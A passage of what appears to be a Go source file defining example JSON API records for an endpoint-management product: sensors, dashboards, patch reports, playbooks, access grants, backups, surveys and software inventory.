			{"id": "evt-35d2b95ac22d20831dbd1b60249a412d", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "stage": "action", "status": "running", "message": "install jq", "timestamp": "2026-10-19T13:02:47.231Z"},
			{"id": "evt-b830873f246dca18f10d7631621a8d95", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "step_id": "s_5b1e9d3a7f2c46e8", "stage": "command", "status": "running", "message": "Run installer", "timestamp": "2026-10-19T13:02:47.236Z"},
			{"id": "evt-9e7092ee0c586942adb1c58b35f68e8a", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "step_id": "s_5b1e9d3a7f2c46e8", "stage": "stdout", "status": "running", "message": "Setting up jq (1.7.1-3build1) ...", "timestamp": "2026-10-19T13:03:14.507Z"},
			{"exit_code": 0, "id": "evt-bd29069970561d01139312e7a7abb13f", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "step_id": "s_5b1e9d3a7f2c46e8", "stage": "execution_result", "status": "running", "message": "Command exited with code 0", "timestamp": "2026-10-19T13:03:15.092Z"},
			{"id": "evt-108b4caab37688406b626e643078e201", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "stage": "check", "status": "running", "message": "sensor installed_apps: agent=0.57.41 revision=builtin match=true rows=[evidence truncated after 16 KB]", "timestamp": "2026-10-19T13:03:20.664Z"},
			{"id": "evt-8585086eea43d121a7440b03b32fe134", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5", "stage": "validated", "status": "running", "message": "Validation passed", "timestamp": "2026-10-19T13:03:20.671Z"},
			{"id": "evt-9a0d323ca38a6e8e9ab554fd3ba837d6", "job_id": "act-8c2e6a0f4b1d47e9a3c5f7b9d1e0a2c4", "run_id": "run-5d1f9b3e7a2c46e8b0d4f6a8c2e1b3d5", "agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4", "stage": "complete", "status": "succeeded", "message": "All required actions and validation completed", "timestamp": "2026-10-19T13:03:20.683Z"}
		],
		"truncated": false
	}`
	// The custom sensor of the body examples, as stored: each platform
	// gets its default language, and the server assigns the ID. Its
	// answers add whether it is enabled and when it was saved.
	timeSyncSensorFields = `"platforms": {
			"linux": {"language": "shell", "output": {"format": "delimited", "delimiter": ","}},
			"windows": {"language": "powershell", "output": {"format": "json"}}
		},
		"fields": [{"name": "service", "type": "string"}, {"name": "state", "type": "string"}],
		"max_age_seconds": 0,
		"id": "csn-8b2f6d0a4e1c47a9b3d5f7e9c1a3b5d7",
		"name": "Time sync service",
		"description": "Whether the clock-sync service is running",
		"commands": {
			"linux": "echo \"systemd-timesyncd,$(systemctl is-active systemd-timesyncd)\"",
			"windows": "[pscustomobject]@{service = 'W32Time'; state = [string](Get-Service W32Time).Status} | ConvertTo-Json"
		},
		"interval_seconds": 3600,
		"timeout_seconds": 30`

	// The panels of the body examples' dashboard, as stored, after their
	// id: Postgres keeps the panels as jsonb, so their keys come back in
	// its order (shortest first), not the order they were saved in.
	platformPanelDef = `"chart": "donut", "title": "Web servers by platform", "width": 1, "source": "endpoints", "group_by": "platform", "group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"]`
	criticalPanelDef = `"chart": "number", "title": "Critical vulnerabilities", "width": 1, "source": "findings", "group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"], "highlight": {"op": "nonzero", "value": 0}, "filter_value": "critical", "filter_column": "severity"`

	webTierDescription = `"description": "Platforms and open vulnerabilities on the web servers"`

	// The dashboard of the body examples. Its answers add their own
	// updated_at.
	webTierDashboardFields = `"id": "db-64d2472106baa7637afc9e7b7aec4f73",
		"name": "Web tier posture",
		` + webTierDescription + `,
		"panels": [
			{"id": "pn-ff888df99f1c427a9cfa7bd1fde8e70f", ` + platformPanelDef + `},
			{"id": "pn-d39dba1141c3f1330c20d7d5f8fe4406", ` + criticalPanelDef + `}
		],
		"panel_count": 2,
		"shared": true,
		"created_by": "jdoe",
		"created_at": "2026-09-22T15:31:08Z"`

	// The donut panel, evaluated over the three web servers.
	platformPanelDataFields = `"chart": "donut",
		"title": "Web servers by platform",
		"count": 3,
		"total": 3,
		"series": [{"label": "Ubuntu", "key": "ubuntu", "value": 3, "share": 100}],
		"highlight": false,
		"width": 1,
		"source": "endpoints",
		"group_by": "platform"`

	// Two of the nine sources a panel or a report section reads.
	reportSourcesExcerpt = `[
			{"desc": "Every managed device with its OS, platform, agent version, site and addresses.", "id": "endpoints", "label": "Endpoints"},
			{"desc": "Per endpoint, per patch, from the cached patches sensor — no fleet sweep to build a report.", "id": "patches", "label": "Missing patches"}
		]`

	// The report of the body examples, as stored. Its sections, after
	// the ID the server gave each, are in jsonb key order.
	weeklyReportHead = `"id": "rep-1f5b9d3a7c2e48b6a0d4c8e2f6b1a9d7",
		"name": "Weekly patch summary",
		"description": "Missing patches across the fleet, for the Monday review"`
	severitySectionDef   = `"title": "Missing patches by severity", "source": "patches", "group_by": "severity"`
	securitySectionDef   = `"limit": 100, "title": "Security updates outstanding", "source": "patches", "columns": ["hostname", "patch", "installed", "available"], "filter_value": "security", "filter_column": "severity"`
	weeklyReportSchedule = `"section_count": 2,
		"enabled": true,
		"schedule_kind": "weekly",
		"time_of_day": "07:00",
		"weekday": 1`

	// It last ran on Monday 19 October, and runs next on the 26th.
	weeklyReportFields = weeklyReportHead + `,
		"sections": [
			{"id": "sec-4a8e2c6f0b1d47e9a3c5b7d9f1e3a5c7", ` + severitySectionDef + `},
			{"id": "sec-8c2a6e0f4b1d49e3a7c5d9b1f3e7a0c2", ` + securitySectionDef + `}
		],
		` + weeklyReportSchedule

	weeklyReportDelivery = `"destination": "webhook",
		"target": "https://hooks.example.com/reports/patching",
		"webhook_style": "slack",
		"email_template": {"subject": "", "text": "", "html": ""},
		"created_at": "2026-09-28T10:14:22Z",
		"created_by": "jdoe"`

	weeklyReportExample = `{` + weeklyReportFields + `,
		"next_run_at": "2026-10-26T07:00:00Z",
		"last_run_at": "2026-10-19T07:00:41Z",
		` + weeklyReportDelivery + `,
		"updated_at": "2026-09-28T10:14:22Z",
		"updated_by": "jdoe"
	}`

	// The report's runs, newest first, as a list shows them: without the
	// document or its digest. jdoe previewed it on Tuesday; the Monday
	// run went to the webhook.
	weeklyReportRunsExample = `[
		{"id": "rpt-6d0b4f8a2c1e47e9b3a5d7c9f1e3b5a7", "report_id": "rep-1f5b9d3a7c2e48b6a0d4c8e2f6b1a9d7", "name": "Weekly patch summary", "generated_at": "2026-10-20T09:12:05Z", "generated_by": "jdoe", "section_count": 2, "row_count": 87, "delivered": false, "preview": true},
		{"id": "rpt-2e6a0c4f8b1d47e3a9c5f7b1d3e9a0c4", "report_id": "rep-1f5b9d3a7c2e48b6a0d4c8e2f6b1a9d7", "name": "Weekly patch summary", "generated_at": "2026-10-19T07:00:41Z", "generated_by": "scheduler", "section_count": 2, "row_count": 87, "delivered": true}
	]`

	// The rendered fragment, cut short after the first two rows of the
	// table section.
	weeklyReportHTMLAfterStamp = ` from mustra's cached fleet data.</p></header><section class=\"rpt-section\"><h2>Missing patches by severity</h2><p class=\"rpt-meta\">64 rows from patches</p><table><thead><tr><th>severity</th><th class=\"num\">Count</th><th class=\"num\">Share</th></tr></thead><tbody><tr><td>(not set)</td><td class=\"num\">41</td><td class=\"num\">64%</td></tr><tr><td>security</td><td class=\"num\">23</td><td class=\"num\">36%</td></tr></tbody></table></section><section class=\"rpt-section\"><h2>Security updates outstanding</h2><p class=\"rpt-meta\">23 rows from patches, where severity contains &#34;security&#34;</p><table><thead><tr><th>hostname</th><th>patch</th><th>installed</th><th>available</th></tr></thead><tbody><tr><td>FIN-LT-0142</td><td>2026-10 Cumulative Update for Windows 11 Version 24H2 for x64-based Systems (KB5066835)</td><td></td><td></td></tr><tr><td>web-01</td><td>openssl</td><td>3.0.13-0ubuntu3.4</td><td>3.0.13-0ubuntu3.5</td></tr>…`

	weeklyReportSummaryAfterStamp = `\n\nMissing patches by severity: 64 rows\n  (not set): 41 (64%)\n  security: 23 (36%)\nSecurity updates outstanding: 23 rows`
	// How current the CISA KEV and EPSS feeds are: the refresh's answer,
	// and the exploitability view's feeds.
	exploitIntelFeedsExample = `{
		"epss_date": "2026-10-19",
		"epss_error": "",
		"epss_fetched_at": "2026-10-20T03:01:44Z",
		"epss_scores": 296417,
		"kev_entries": 1468,
		"kev_error": "",
		"kev_fetched_at": "2026-10-20T03:01:12Z",
		"kev_version": "2026.10.17"
	}`

	// The playbook's one step. A run keeps its own copy, so editing the
	// playbook does not change a run already under way.
	playbookStepsJSON = `[{"id": "pbs-3d7f1b5a9c2e48e6b0a4d8f2c6e1a3b9", "name": "Apply pending patches", "kind": "patch", "on_failure": "stop"}]`

	// The playbook of the body examples, as stored: weekly on Tuesdays
	// at 22:00 UTC, so the next run is tonight. Its run (POST
	// /api/playbooks/{id}/run) is the one the run examples follow.
	playbookWeeklyFields = `"id": "pb-61a3b2f60a1ace8deee382700533b5a5",
		"name": "Weekly patching for web servers",
		"description": "Apply pending patches without restarting",
		"os": "linux",
		"group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3",
		"group_name": "Web servers",
		"group_deleted": false,
		"steps": ` + playbookStepsJSON + `,
		"step_count": 1,
		"enabled": true,
		"schedule_kind": "weekly",
		"time_of_day": "22:00",
		"weekday": 2,
		"next_run_at": "2026-10-20T22:00:00Z"`

	// After two weeks of scheduled runs.
	playbookWeeklyRecord = `{` + playbookWeeklyFields + `,
		"last_run_at": "2026-10-13T22:00:04Z",
		"created_at": "2026-10-06T14:12:40Z",
		"created_by": "jdoe",
		"updated_at": "2026-10-06T14:12:40Z",
		"updated_by": "jdoe"
	}`

	// The manual run of the playbook, still walking its twelve web
	// servers.
	playbookRunManualExample = `{
		"id": "pbr-8e4a0c6f2b1d47e9a3c5b7d9f1e2a4c6",
		"playbook_id": "pb-61a3b2f60a1ace8deee382700533b5a5",
		"name": "Weekly patching for web servers",
		"steps": ` + playbookStepsJSON + `,
		"target_desc": "group: Web servers · linux",
		"agent_count": 12,
		"status": "running",
		"triggered_by": "jdoe",
		"started_at": "2026-10-20T09:31:07Z",
		"finished_at": null
	}`

	// Last week's scheduled run: three of the twelve did not finish
	// every step.
	playbookRunScheduledExample = `{
		"id": "pbr-0c4e8a2f6b1d47e9a3c5d7f9b1e3a5c7",
		"playbook_id": "pb-61a3b2f60a1ace8deee382700533b5a5",
		"name": "Weekly patching for web servers",
		"steps": ` + playbookStepsJSON + `,
		"target_desc": "group: Web servers · linux",
		"agent_count": 12,
		"status": "partial",
		"triggered_by": "scheduler",
		"started_at": "2026-10-13T22:00:04Z",
		"finished_at": "2026-10-13T22:41:19Z"
	}`

	// The runs list, newest first.
	playbookRunsJSON = `[` + playbookRunManualExample + `, ` + playbookRunScheduledExample + `]`

	// The jump policy of the body examples, as stored; an update stamps
	// updated_at.
	jumpPolicyFields = `"id": "jp-2b6f0d4a8c1e47e9b3a5d7f9c1e3a5b7",
		"name": "Production servers need approval",
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"require_approval": true,
		"require_reason": true,
		"max_minutes": 60,
		"priority": 10,
		"enabled": true,
		"created_by": "jdoe",
		"created_at": "2026-09-14T11:20:33Z"`

	jumpPolicyRecordExample = `{` + jumpPolicyFields + `, "updated_at": "2026-09-14T11:20:33Z"}`

	// rpatel's request for web-01 under that policy, as asked for: the
	// answer to the request is the grant before anyone decides.
	jumpGrantFields = `"id": "jg-7c1e5a9f3b2d48e6a0c4b8d2f6e1a3c5",
		"agent_id": "agt-4f2a9c1e7b3d48e6a05c9d2f81b7e3a4",
		"hostname": "web-01",
		"policy_id": "jp-2b6f0d4a8c1e47e9b3a5d7f9c1e3a5b7",
		"policy_name": "Production servers need approval",
		"requested_by": "rpatel",
		"reason": "Investigating high CPU on INC-2041",
		"max_minutes": 60`

	// The indicator of the body examples, as stored.
	iocDropperExample = `{
		"id": "ioc-7b3d9f1a5e2c48b6a0d4c8e2f6b1a9d3",
		"name": "Dropper from INC-2041",
		"kind": "file_hash",
		"value": "9f2c4e7a1b3d5f8e0a6c2b4d7e9f1a3c5b8d0e2f4a6c9b1d3e5f7a0c2e4b6d8f",
		"severity": "critical",
		"description": "Installer dropped by the phishing mail in INC-2041",
		"source": "INC-2041",
		"enabled": true,
		"created_at": "2026-10-19T15:58:12Z",
		"created_by": "jdoe"
	}`

	// The cost_centre attribute of the body examples, as an endpoint's
	// Attributes tab shows it, without its updated_at: an edit stamps
	// that.
	costCentreAttributeFields = `"id": "attr-5e9c1a7d3b2f46e8a0c4d6b8f2e1a3c7",
		"name": "cost_centre",
		"label": "Cost centre",
		"kind": "select",
		"options": ["Engineering", "Finance", "Sales"],
		"description": "Which budget pays for the endpoint",
		"created_by": "jdoe",
		"created_at": "2026-05-04T09:15:00Z"`

	// As created, and as listed.
	costCentreAttributeRecord = `{` + costCentreAttributeFields + `, "updated_at": "2026-05-04T09:15:00Z"}`

	// The deployments export: every hour, the deployments started since
	// the last run, as a CSV file under the export directory. Its cursor
	// is the newest start it has sent, to the microsecond.
	deploymentsExportFields = `"id": "exp-0d4f8b2a6c1e47e9a3b5d7f9c1e3a5b8",
		"name": "Deployments to the change log",
		"source": "deployments",
		"format": "csv",
		"destination": "file",
		"target": "change-log/",
		"interval_minutes": 60,
		"enabled": true`

	// The export of the body examples, without what its runs and its
	// headers add.
	siemExportFields = `"id": "exp-5b9d3f7a1c2e48e6b0a4c8d2f6e1a3b7",
		"name": "Vulnerabilities to the SIEM",
		"source": "findings",
		"format": "ndjson",
		"destination": "webhook",
		"target": "https://siem.corp.example.com/ingest/mustra",
		"interval_minutes": 1440,
		"enabled": true`

	// After a week of daily runs, with an Authorization header added
	// since it was created. The answer names the header and never shows
	// its value. A findings export keeps no cursor: each run sends the
	// whole list.
	siemExportRecord = `{` + siemExportFields + `,
		"last_run_at": "2026-10-20T06:00:12Z",
		"last_row_count": 37,
		"created_at": "2026-10-06T10:41:27Z",
		"created_by": "jdoe",
		"headers_set": true,
		"header_names": ["Authorization"]
	}`

	// The directory settings for Impact: the domain of the body example,
	// reached with StartTLS. The bind password is stored sealed; the
	// answer says only that one is set.
	directorySettingsFields = `"url": "ldap://dc01.corp.example.com",
		"bind_dn": "CN=svc-mustra,OU=Service Accounts,DC=corp,DC=example,DC=com",
		"password_set": true,
		"base_dn": "DC=corp,DC=example,DC=com",
		"starttls": true,
		"insecure_skip_verify": false,
		"allow_insecure": false,
		"ca_pem": "",
		"enabled": true,
		"interval_minutes": 60`

	// After the last scheduled sync. counts.synced_at is when the sync
	// wrote its objects, just before it recorded last_sync (to the
	// second).
	directoryViewExample = `{` + directorySettingsFields + `,
		"last_sync": "2026-10-20T08:00:32Z",
		"last_summary": "corp.example.com (CORP): 57 users, 23 groups, 44 computers, 212 memberships in 1.284s",
		"counts": {"users": 57, "groups": 23, "computers": 44, "memberships": 212, "synced_at": "2026-10-20T08:00:31.207418Z"}
	}`

	// The notice of the body examples, as stored: a notice takes the
	// default countdown and reminder interval and cannot be postponed.
	eunNoticeFields = `"id": "eun-2d8f4b0a6c1e47e3a9b5d7f1c3e9a0b6",
		"kind": "notice",
		"name": "Patch window notice",
		"title": "Updates tonight at 22:00 UTC",
		"body": "Your computer installs updates tonight between 22:00 and 23:00 UTC. Save your work before you leave.",
		"deadline_at": "2026-11-03T23:00:00Z",
		"allow_postpone": false,
		"countdown_minutes": 15,
		"gentle_minutes": 60,
		"postpone_minutes": [],
		"buttons": [{"label": "Got it", "action": "acknowledged", "primary": true}],
		"created_at": "2026-10-20T09:05:18Z"`

	// As created.
	eunNoticeRecord = `{` + eunNoticeFields + `, "updated_at": "2026-10-20T09:05:18Z", "created_by": "jdoe"}`

	// Last night's scheduled backup, as its manifest records it. The
	// server reads the manifest back out of the archive, so created_at
	// keeps the nanoseconds of the time.Now() that stamped it. Without
	// package files there is no package_files_sha256.
	backupNightlyManifestFields = `"id": "bk-c14b44595852bbb7931b67bbaaedee40",
		"created_at": "2026-10-20T03:07:41.208337915Z",
		"created_by": "scheduled",
		"server_version": "0.93.0",
		"includes_package_files": false,
		"database_sha256": "1c366ceefddc9c30b4f2781639add84a7812456504a4c38cfd5959869f6cc4d4",
		"database_bytes": 412650496,
		"note": "nightly",
		"signature": "544fe34affae2f31cca97f002a72cb6924ed904052f585005d18d558932ea658"`

	backupNightlyRecordExample = `{` + backupNightlyManifestFields + `,
		"filename": "bk-c14b44595852bbb7931b67bbaaedee40.tar.gz",
		"bytes": 48190211
	}`

	// The backup the body example takes by hand before an upgrade.
	backupManualRecordExample = `{
		"id": "bk-d86a1f3af286296c6bcaef1dc82e2a63",
		"created_at": "2026-10-20T09:02:14.583920417Z",
		"created_by": "jdoe",
		"server_version": "0.93.0",
		"includes_package_files": false,
		"database_sha256": "e8afa935daa8e6a89d2791b0c7e945bd55f77fab1e2f57cc5fc8f31daafff76f",
		"database_bytes": 412873216,
		"note": "Before upgrading the server",
		"signature": "4bf87d05d0ab3832a02cbd7e49d4e3644aff10e0a2e709799bf51a34c2a07a26",
		"filename": "bk-d86a1f3af286296c6bcaef1dc82e2a63.tar.gz",
		"bytes": 48213377
	}`

	// Nightly at 03:00 UTC, the last seven kept, without package files.
	backupSettingsExample = `{"enabled": true, "hour_utc": 3, "keep": 7, "include_package_files": false}`

	// The impact analysis reads a fleet of 42: the twelve web servers,
	// 28 Windows workstations, the domain controller dc01 and the Mac
	// build host. Directory principals are keyed by SID, local ones by
	// endpoint and name. adm-jdoe, jdoe's admin account in Domain
	// Admins, is still signed in on FIN-LT-0142.
	impactAdmJdoeRating = `{"id": "S-1-5-21-3623811015-3361044348-30300820-1110", "kind": "user", "name": "adm-jdoe", "domain": "CORP", "level": "critical", "score": 37, "controls": 29, "direct_controls": 0, "controls_critical": 1, "sessions": 1, "member_users": 0, "enabled": true, "admin_count": true}`

	impactAdministratorRating = `{"id": "S-1-5-21-3623811015-3361044348-30300820-500", "kind": "user", "name": "Administrator", "domain": "CORP", "level": "critical", "score": 37, "controls": 29, "direct_controls": 1, "controls_critical": 1, "sessions": 0, "member_users": 0, "enabled": true, "admin_count": true}`

	// dc01 reaches nothing, as nobody is signed in on it, but three
	// workstations reach it. An endpoint's row carries the endpoint's
	// fields only, and a user's or group's row the principal's.
	impactDC01Rating = `{"id": "agt-f3099a1e6d52b245d944186a38757d0a", "kind": "endpoint", "name": "dc01", "level": "none", "score": 0, "hostname": "dc01", "domain_controller": true, "online": true, "admins": 2, "outbound": 0, "inbound": 3}`

	// The survey of the body examples, as stored: the operator's view
	// keeps the positive options, which the endpoints are never sent.
	surveyLaptopFields = `"id": "svy-5c9e1a3f7b2d48e6a0c4b8d2f6e1a3c7",
		"name": "Laptop refresh feedback",
		"title": "How is your new laptop?",
		"intro": "Three questions, two minutes. Your answers are anonymous.",
		"questions": [
			{"id": "overall", "kind": "rating", "text": "How happy are you with the new laptop?", "required": true},
			{"id": "speed", "kind": "choice", "text": "Compared with your old one, it is", "options": ["Faster", "About the same", "Slower"], "positive": ["Faster", "About the same"]},
			{"id": "comments", "kind": "text", "text": "Anything we should fix?"}
		],
		"anonymous": true,
		"deadline_at": "2026-11-03T22:00:00Z",
		"created_at": "2026-10-19T10:12:40Z",
		"created_by": "jdoe"`

	// Saved a second time before it was sent.
	surveyLaptopRecord = `{` + surveyLaptopFields + `, "updated_at": "2026-10-19T10:14:02Z"}`

	// The survey with its score, after a day out on the 28 Windows
	// workstations: five answers and one decline. Only answers are
	// scored, rating and choice alike, so ten are. Six replies of 28
	// asked is under 30%, so the band is good_thin. An anonymous
	// survey records no endpoint, so responded is 0 and the rate counts
	// replies.
	surveyLaptopSummary = `{` + surveyLaptopFields + `,
		"updated_at": "2026-10-19T10:14:02Z",
		"counts": {"sent": 28, "answered": 5, "declined": 1, "responded": 0},
		"sentiment": 78,
		"band": "good_thin",
		"reason": "5 answer(s) from 6 of 28 asked; 1 declined; only 21% replied, so read this as those people's view rather than the fleet's; anonymous answers cannot be attributed, so this counts replies rather than machines",
		"response_rate": 0.21428571428571427,
		"rate_basis": "replies",
		"scored_answers": 10,
		"per_question": [
			{"id": "overall", "kind": "rating", "text": "How happy are you with the new laptop?", "answers": 5, "average": 4, "counts": {"2": 1, "4": 2, "5": 2}},
			{"id": "speed", "kind": "choice", "text": "Compared with your old one, it is", "answers": 5, "counts": {"About the same": 1, "Faster": 3, "Slower": 1}},
			{"id": "comments", "kind": "text", "text": "Anything we should fix?", "answers": 3, "samples": ["Teams freezes when I share my screen", "The dock does not wake the second monitor", "Battery lasts all day now"]}
		]
	}`

	// What the patch list of the body examples admits, in the list and in
	// its export.
	securityAfterAWeekRules = `{"severities": ["security"], "os": ["linux"], "min_age_days": 7}`

	// What tail -n 50 printed of web-01's nginx error log, two lines since
	// the midnight rotation, as rpatel's shell session got it and as the
	// command log keeps it.
	nginxErrorLogTail = `"2026/10/20 09:02:11 [error] 1190#1190: *48211 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 10.40.7.23, server: www.example.com, request: \"GET /api/orders HTTP/1.1\", upstream: \"http://127.0.0.1:8080/api/orders\", host: \"www.example.com\"\n2026/10/20 09:02:14 [error] 1190#1190: *48217 no live upstreams while connecting to upstream, client: 10.40.7.23, server: www.example.com, request: \"GET /api/orders HTTP/1.1\", upstream: \"http://backend/api/orders\", host: \"www.example.com\"\n"`

	// The tracked product of the body examples, installed on two
	// endpoints: FIN-LT-0142 opened it on two of the last 30 days, and
	// build-mac-02 not since June, before mustra was watching. Its cost
	// is per seat, so the unused seat is the waste.
	diagramStudioProductExample = `{
		"key": "example diagram studio",
		"name": "Example Diagram Studio",
		"vendor": "Example Software",
		"component": false,
		"platforms": ["darwin", "windows"],
		"versions": ["24.2.1"],
		"executables": ["diagramstudio", "example diagram studio", "examplediagramstudio"],
		"installed": 2,
		"used": 1,
		"unused": 1,
		"unknown": 0,
		"levels": {"light": 1, "unused": 1},
		"first_seen": "2026-07-23T09:16:40Z",
		"last_used": "2026-10-19T14:22:51Z",
		"tracked": true,
		"tracked_id": "trk-2691c747da54257d11c96e754ef3b46a",
		"cost_per_seat_cents": 1500,
		"currency": "USD",
		"est_annual_cents": 3000,
		"est_waste_cents": 1500,
		"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
		"in_catalog": true
	}`

	// The fleet's software inventory over the default 30 days, with 90
	// days of usage history. Diagram Studio is its one tracked product,
	// so the cost estimates are that product's.
	softwareInventorySummaryFields = `"products": 1284,
		"applications": 312,
		"tracked": 1,
		"endpoints": 42,
		"unused_seats": 389,
		"est_annual_cents": 3000,
		"est_waste_cents": 1500,
		"window_days": 30,
		"history_days": 90`

	// The jq installer uploaded to the jq package. The upload's answer is
	// the same record.
	jqPackageFileExample = `{
		"id": "pf-0c6e2a8f4b1d49e3a7c5f9b1d3e8a0c2",
		"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
		"name": "jq-windows-amd64.exe",
		"size_bytes": 3466752,
		"sha256": "7f3e1b9c5a2d4e8f0b6c1a3d5e7f9b2c4d6e8a0f1b3c5d7e9f2a4b6c8d0e1f3a",
		"created_at": "2026-09-30T15:24:02Z",
		"created_by": "jdoe"
	}`

	// The tracked product of the body examples, as stored, linked to the
	// package its body names. Its answers add their own updated_at.
	diagramStudioTrackedFields = `"id": "trk-3c9e5a1f7b2d48e6a0c4d8b2f6e1a3c7",
		"product_key": "example diagram studio",
		"name": "Example Diagram Studio",
		"vendor": "Example Software",
		"executables": ["diagramstudio"],
		"cost_per_seat_cents": 1500,
		"currency": "USD",
		"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
		"notes": "Licensed per seat; renews in March",
		"created_by": "jdoe",
		"created_at": "2026-10-02T13:47:21Z"`

	// The watchlist of the body examples, as stored: the one the Web
	// server configuration monitor watches. Its answers add their own
	// updated_at.
	webConfigWatchlistFields = `"id": "wl-8e3b1f7d2a6c49e0b5d1a9f3c7e2b4d6",
		"name": "Web server configuration",
		"description": "nginx and IIS configuration on the web tier",
		"template": "",
		"paths": ["/etc/nginx", "C:\\inetpub\\wwwroot\\web.config"],
		"registry_keys": ["HKLM\\SYSTEM\\CurrentControlSet\\Services\\W3SVC"],
		"follow_symlinks": false,
		"created_by": "jdoe",
		"created_at": "2026-09-24T10:12:07Z"`

	// The deployment plan of the body examples, as stored: the Pilot
	// group first, then the web servers.
	pilotPlanExample = `{
		"id": "plan-aa84f3bbe99040d7d2c10d3c11ab9c32",
		"name": "Pilot, then web servers",
		"kind": "custom",
		"rings": [
			{"name": "Pilot", "group_id": "cgrp-6ea76dc9c2fb40e65159fc3cbda2a266", "min_success": 3, "wait_minutes": 60},
			{"name": "Web servers", "group_id": "cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3", "success_rate": 95}
		],
		"created_at": "2026-09-12T16:03:27Z",
		"created_by": "jdoe"
	}`

	// The schedule of the body examples, as stored: jq updated on the
	// web servers every Sunday at 03:00 UTC, since the Sunday after jq
	// was added. Each answer adds its run times.
	sundayScheduleFields = `"follow_latest": false,
		"id": "sch-9a5e1c7f3b2d48e6a0d4c8b2f6e1a3d5",
		"name": "Sunday update for web servers",
		"package_id": "sw-7d3b9f1a5e2c48b6a0d4f8e2c6b1a9d5",
		"operation": "update",
		"parameters": {},
		"target_os": "",
		"target_site": "",
		"target_agent": "",
		"agent_ids": [],
		"group_ids": ["cgrp-1c8e4a2f6b9d43e7a5c0f2b8d6e4a1c3"],
		"allow_reboot": false,
		"force_remove": false,
		"expire_seconds": 14400,
		"override_windows": false,
		"notify_message_id": "",
		"notify_on_finish": true,
		"kind": "weekly",
		"time_of_day": "03:00",
		"weekday": 0,
		"enabled": true`

	// Last week's run, and the next one.
	sundayScheduleExample = `{` + sundayScheduleFields + `,
		"last_run_at": "2026-10-18T03:00:02Z",
		"next_run_at": "2026-10-25T03:00:00Z",
		"created_at": "2026-10-04T10:12:44Z",
		"created_by": "jdoe"
	}`

	// The two open items in the notification tray, without last_seen,
	// which each evaluation pass moves on. The certificate is the
	// inventory's legacy-api one, critical since it came within a week of
	// expiry; the agents are the five on 0.57.40.
	guideCertItemFields = `"id": "gd-4b8f2d6a0c1e47e9b3a5c7d9f1e3a5b7",
		"subject_key": "certificates:critical",
		"source": "certificates",
		"kind": "guidance",
		"severity": "medium",
		"title": "1 service certificate(s) expire within a week",
		"detail": "Soonest: legacy-api.corp.example.com in 5 day(s). Renew before they lapse.",
		"link": "/certificates",
		"count": 1,
		"first_seen": "2026-10-18T06:01:31Z"`

	guideAgentsItemFields = `"id": "gd-8e2c6a0f4b1d47e3a9c5d7f1b3e9a0c6",
		"subject_key": "agents:behind:0.57.41",
		"source": "agents",
		"kind": "observation",
		"severity": "low",
		"title": "5 endpoint(s) run an agent older than 0.57.41",
		"detail": "FIN-LT-0142, FIN-LT-0157, HR-LT-0031, MKT-LT-0088, SALES-LT-0208. Client Management shows every version; the \"Update mustra agent\" package targets exactly these.",
		"link": "/agents#overview",
		"count": 5,
		"first_seen": "2026-10-18T21:58:20Z"`

	// The Self Service window's look. The save listed three tabs, two of
	// them relabelled, and the server appended the two it left out in
	// their default order. Both routes answer with it and its hash.
	selfServiceBrandingExample = `{
		"branding": {
			"window_title": "Example Corp IT",
			"org_name": "Example Corp",
			"welcome": "Install approved software and keep this computer up to date.",
			"help_heading": "Need help?",
			"help_text": "Open an IT ticket",
			"help_url": "https://help.example.com/it",
			"theme": "system",
			"accent": "#2f6fde",
			"font": "segoe",
			"radius": 8,
			"pattern": "waves",
			"pattern_opacity": 30,
			"tabs": [
				{"id": "catalog", "label": "Software"},
				{"id": "updates"},
				{"id": "activity", "label": "What IT did"},
				{"id": "history"},
				{"id": "device"}
			],
			"default_tab": "catalog"
		},
		"version": "5b008b39a11416e8"
	}`

	// rpatel's Direct Connect session on web-01, opened with the shell
	// body example under the Jump Gate grant jdoe approved for INC-2041.
	// It closed before the grant's window ran out.
	rpatelSessionFields = `"id": "sh-3e7a1c5f9b2d48e6a0c4d8f2b6e1a3c9",
